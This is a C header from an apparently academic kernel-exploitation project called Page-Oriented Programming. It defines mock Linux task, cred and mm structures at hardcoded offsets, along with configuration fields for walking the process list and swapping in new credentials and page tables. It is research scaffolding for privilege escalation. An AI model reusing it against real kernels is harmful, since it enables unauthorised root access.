/**
 *                   Page-Oriented Programming (POP)
 *                   -------------------------------
 *
 *                   Copyright (C) 2023 Seunghun Han
 *                 at the Affiliated Institute of ETRI
 * Project link: https://github.com/kkamagui/page-oriented-programming 
 */
#ifndef __CVE_STRUCT_H__
#define __CVE_STRUCT_H__

#include <stdio.h>
#include <stdarg.h>
#include "cve_page.h"

#define OFFSET_TASKS_IN_TASKSTRUCT			2256
#define OFFSET_MM_IN_TASKSTRUCT				2336
#define OFFSET_CRED_IN_TASKSTRUCT			2904
#define OFFSET_COMM_IN_TASKSTRUCT			2928

#define OFFSET_PGD_IN_MMSTRUCT				72
#define OFFSET_THREADKEYRING_IN_CREDSTRUCT	104

enum {
	TASK_COMM_LEN = 16,
};

typedef unsigned long	uint64_t;

// 16 bytes
struct list_head
{
	struct list_head *next, *prev;
};

// Dummy mm struct
struct mm_struct
{
	char buffer1[OFFSET_PGD_IN_MMSTRUCT];
	pgd_t * pgd;
};

// Dummy cred struct
struct cred
{
	char buffer1[OFFSET_THREADKEYRING_IN_CREDSTRUCT];
	uint64_t* thread_keyring;
};

// Dummy task struct
struct task_struct 
{
	char buffer1[OFFSET_TASKS_IN_TASKSTRUCT];
	struct list_head tasks;

	char buffer2[OFFSET_MM_IN_TASKSTRUCT - OFFSET_TASKS_IN_TASKSTRUCT - 16];
	struct mm_struct* mm;

	char buffer3[OFFSET_CRED_IN_TASKSTRUCT - OFFSET_MM_IN_TASKSTRUCT - 8];
	struct cred* real_cred;

	char buffer4[OFFSET_COMM_IN_TASKSTRUCT - OFFSET_CRED_IN_TASKSTRUCT - 8];
	char comm[TASK_COMM_LEN];
};

// Configuration data
struct cve_config
{
	uint64_t phy_start;
	uint64_t phy_size;
	int free_page_index;
	char* phy_mapped_address;
	int debug;
	int fd;
	uint64_t rel_text_section_offset;
	uint64_t abs_text_section_offset;
	uint64_t kernel_start_address;
	uint64_t page_offset_base;
	uint64_t per_cpu_offset;

	uint64_t user_init_task_address;
	uint64_t kernel_new_cred_address;
	uint64_t user_cur_mm_address;
	uint64_t kernel_org_cr3;
};

// Global Variables
extern struct cve_config g_config;

//=============================================================================
// Global Functions 
void *kernel_virt_to_phys(void* virt);
void *user_virt_to_phys(void* user_virt);
void *user_phys_to_virt(void* phys);
void *convert_kernel_virt_to_user_virt(void* virt);
void dbg_printf(const char* format, ...);

//=============================================================================
// Copies from the kernel code

/* Are two types/vars the same type (ignoring qualifiers)? */
#define static_assert(expr, ...) 
#define __same_type(a, b) __builtin_types_compatible_p(typeof(a), typeof(b))

#define container_of(ptr, type, member) ({				\
	void *__mptr = (void *)(ptr);					\
	static_assert(__same_type(*(ptr), ((type *)0)->member) ||	\
		      __same_type(*(ptr), void),			\
		      "pointer type mismatch in container_of()");	\
	((type *)(__mptr - offsetof(type, member))); })

#define list_entry(ptr, type, member) \
	container_of(ptr, type, member)

#define next_task(p) \
	list_entry((p)->tasks.next, struct task_struct, tasks)

#endif
